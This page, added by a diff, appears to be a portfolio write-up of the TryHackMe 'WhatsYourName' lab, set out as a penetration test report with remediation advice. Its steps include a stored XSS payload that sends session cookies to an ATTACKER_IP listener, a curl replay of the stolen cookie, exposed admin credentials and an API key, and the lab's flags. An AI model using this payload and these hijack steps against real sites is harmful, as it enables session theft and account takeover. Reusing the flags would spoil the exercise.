@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A client-side exploitation assessment was conducted against the WorldWAP web application hosted at 10.64.189.164. Three critical vulnerabilities were identified">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="WhatsYourName — Penetration Test Disclosure Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>WhatsYourName — Penetration Test Disclosure Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">WhatsYourName — Penetration Test Disclosure Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-medium">Medium</span> <span class="dot">·</span> <span class="date">2026-07-13</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.64.189.164 (worldwap.thm / login.worldwap.thm) <strong>Assessment Date:</strong> 2026-07-13 <strong>Classification:</strong> CONFIDENTIAL</p>
+<hr>
+<h2>1. Executive Summary</h2>
+<p>A client-side exploitation assessment was conducted against the WorldWAP web application hosted at 10.64.189.164. Three critical vulnerabilities were identified: a stored Cross-Site Scripting (XSS) vulnerability in the registration form, a sensitive data exposure of hardcoded administrator credentials in a publicly accessible Python script, and missing security flags (httponly) on session cookies. These vulnerabilities were chained to achieve full compromise of both moderator and administrator accounts, resulting in the capture of both flags. No server-side exploitation was required.</p>
+<hr>
+<h2>2. Scope</h2>
+<table>
+<thead><tr>
+<th>Element</th>
+<th>Detail</th>
+</tr></thead><tbody>
+<tr>
+<td>Target</td>
+<td>10.64.189.164</td>
+</tr>
+<tr>
+<td>Hostnames</td>
+<td>worldwap.thm, login.worldwap.thm</td>
+</tr>
+<tr>
+<td>Ports in Scope</td>
+<td>22/tcp (SSH), 80/tcp (HTTP), 8081/tcp (HTTP)</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>WorldWAP social networking platform (PHP), phpMyAdmin 4.9.5</td>
+</tr>
+<tr>
+<td>Assessment Type</td>
+<td>External penetration test</td>
+</tr>
+<tr>
+<td>Environment</td>
+<td>Ubuntu Linux, Apache 2.4.41, OpenSSH 8.2p1</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>3. Attack Chain</h2>
+<pre><code>Registration form (XSS injection in Name field) 
+  → Moderator bot reviews registration 
+  → Stolen PHPSESSID cookie exfiltrated via Image src
+  → Used cookie to impersonate moderator 
+  → Moderator flag captured: ModP@wnEd
+  
+Public admin.py (credential exposure)
+  → Extracted admin credentials (admin:Un6u3$$4Bl3!!)
+  → Logged in as admin on login.worldwap.thm
+  → Admin flag captured: AdM!nP@wnEd</code></pre>
+<hr>
+<h2>4. Findings Summary</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Finding</th>
+<th>CVSSv3</th>
+<th>Risk</th>
+</tr></thead><tbody>
+<tr>
+<td>F-01</td>
+<td>Stored XSS in Registration Form (Name Field)</td>
+<td>9.0</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>Missing httponly Flag on PHPSESSID Cookie</td>
+<td>7.4</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Hardcoded Admin Credentials in Public admin.py</td>
+<td>9.8</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-04</td>
+<td>Sensitive File Exposure (setup.php, API endpoint)</td>
+<td>5.3</td>
+<td>Medium</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>5. Detailed Findings</h2>
+<h3>F-01: Stored XSS in Registration Form (Name Field)</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.0) <strong>Affected Component:</strong> <code>http://worldwap.thm/public/html/register.php</code> → <code>../../api/register.php</code></p>
+<p><strong>Description:</strong> The WorldWAP registration form allows pre-registration with a "Name" field that is submitted as JSON to an API endpoint. The registration details are reviewed by a moderator whose browser renders the submitted data, including the Name field, without sanitization. This enables a stored Cross-Site Scripting (XSS) attack that executes in the moderator's browser context, allowing cookie theft and session hijacking.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># 1. Register a user with XSS payload in the Name field
+curl -X POST http://worldwap.thm/api/register.php \
+  -H &quot;Content-Type: application/json&quot; \
+  -H &quot;X-THM-API-Key: e8d25b4208b80008a9e15c8698640e85&quot; \
+  -d &#x27;{&quot;username&quot;:&quot;xssuser&quot;,&quot;password&quot;:&quot;test123&quot;,&quot;email&quot;:&quot;xss@test.com&quot;,&quot;name&quot;:&quot;&lt;script&gt;var i=new Image;i.src=\&quot;http://ATTACKER_IP:9999/?cookie=\&quot;+document.cookie;&lt;/script&gt;&quot;}&#x27;
+
+# 2. Start HTTP listener on attacker machine
+python3 -m http.server 9999
+
+# 3. Wait ~45 seconds for moderator bot to review registration
+# 4. Captured cookie: PHPSESSID=r8t1tvcjlm8s2qisd361vrn6jq
+
+# 5. Use stolen cookie to impersonate moderator
+curl -b &quot;PHPSESSID=r8t1tvcjlm8s2qisd361vrn6jq&quot; http://login.worldwap.thm/profile.php</code></pre>
+<p><strong>Impact:</strong> Full session hijacking of moderator accounts. An attacker can impersonate any moderator, access the dashboard, view flags, and perform moderator-level actions.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N — Network-accessible, low complexity, no privileges required, user interaction (moderator must review), changed scope (affects moderator session), high confidentiality and integrity impact.</p>
+<hr>
+<h3>F-02: Missing httponly Flag on PHPSESSID Cookie</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.4) <strong>Affected Component:</strong> PHPSESSID cookie on all login.php responses</p>
+<p><strong>Description:</strong> The PHPSESSID session cookie is set without the <code>HttpOnly</code> flag, making it accessible to JavaScript. This means that any XSS vulnerability in the application can be leveraged to read the session cookie and hijack user sessions. The cookie domain is set to <code>.worldwap.thm</code>, meaning it is shared across all subdomains and virtual hosts.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -v http://10.64.189.164/login.php 2&gt;&amp;1 | grep &quot;Set-Cookie&quot;
+# Output: Set-Cookie: PHPSESSID=...; path=/; domain=.worldwap.thm
+# Note: No HttpOnly flag present</code></pre>
+<p><strong>Impact:</strong> Amplifies the impact of any XSS vulnerability by enabling session cookie theft via <code>document.cookie</code>. Without this flag, XSS attacks are limited to same-origin actions but cannot exfiltrate session tokens.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N — Network-accessible, low complexity, no privileges, user interaction required, high CIA impact.</p>
+<hr>
+<h3>F-03: Hardcoded Admin Credentials in Public admin.py</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.8) <strong>Affected Component:</strong> <code>http://login.worldwap.thm/admin.py</code> and <code>http://worldwap.thm:8081/admin.py</code></p>
+<p><strong>Description:</strong> A Python Selenium bot script (<code>admin.py</code>) is publicly accessible on both virtual hosts. This script contains hardcoded administrator credentials in plaintext: <code>admin:Un6u3$$4Bl3!!</code>. The script also reveals the application's internal architecture, including the admin bot's behavior (logging in, navigating to chat, clicking links in messages).</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -s http://login.worldwap.thm/admin.py | grep -E &quot;username|password&quot;
+# Output: username = &#x27;admin&#x27;
+# Output: password = &#x27;Un6u3$$4Bl3!!&#x27;</code></pre>
+<p><strong>Impact:</strong> Complete compromise of the administrator account without any exploitation. The exposed credentials provide direct access to the admin panel and all administrator functionality.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — Network-accessible, low complexity, no privileges, no user interaction required, full CIA compromise.</p>
+<hr>
+<h3>F-04: Sensitive File Exposure (setup.php, API endpoint)</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 5.3) <strong>Affected Component:</strong> <code>/setup.php</code>, <code>/api/register.php</code></p>
+<p><strong>Description:</strong> The <code>setup.php</code> script is publicly accessible and can be invoked to recreate the database, tables, and initial records. The <code>/api/register.php</code> endpoint is accessible with a static API key embedded in client-side JavaScript. These files should not be publicly accessible in production.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -s http://10.64.189.164/setup.php
+# Output: Database created successfully / Table users created / etc.
+
+curl -s http://worldwap.thm/public/js/register.js | grep &quot;API-Key&quot;
+# Output: &#x27;X-THM-API-Key&#x27;: &#x27;e8d25b4208b80008a9e15c8698640e85&#x27;</code></pre>
+<p><strong>Impact:</strong> Database reset/recreation via setup.php, and unauthorized registration via exposed API endpoint and key.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L — Network-accessable, low complexity, no privileges, no user interaction, low integrity and availability impact.</p>
+<hr>
+<h2>6. Remediation Recommendations</h2>
+<ol>
+<li><strong>F-01 (XSS):</strong> Implement server-side input sanitization and output encoding on all user-supplied fields. Use a Content Security Policy (CSP) to restrict inline script execution. Consider using HTMLPurifier or a similar library for the Name field.</li>
+</ol>
+<ol>
+<li><strong>F-02 (httponly):</strong> Set the <code>HttpOnly</code> flag on all session cookies in the PHP configuration:</li>
+<pre><code>   session.cookie_httponly = 1</code></pre>
+</ol>
+<ol>
+<li><strong>F-03 (Credential Exposure):</strong> Remove <code>admin.py</code> from the web-accessible directory. Never store credentials in source code. Use environment variables or a secrets manager for sensitive configuration. Rotate the exposed admin password immediately.</li>
+</ol>
+<ol>
+<li><strong>F-04 (File Exposure):</strong> Remove or restrict access to <code>setup.php</code> and the API registration endpoint in production. Use <code>.htaccess</code> rules or Apache configuration to deny access to sensitive files. Move API keys to server-side configuration.</li>
+</ol>
+<hr>
+<h2>7. Flags Obtained</h2>
+<ul>
+<li><strong>Moderator Flag:</strong> <code>ModP@wnEd</code></li>
+<li><strong>Admin Panel Flag:</strong> <code>AdM!nP@wnEd</code></li>
+</ul>
+<hr>
+<h2>8. Cleanup</h2>
+<ul>
+<li>[x] Temp files removed from target (none uploaded)</li>
+<li>[x] No shells left running</li>
+<li>[ ] Credentials should be rotated by the application owner</li>
+<li>[x] Journal updated with all findings</li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
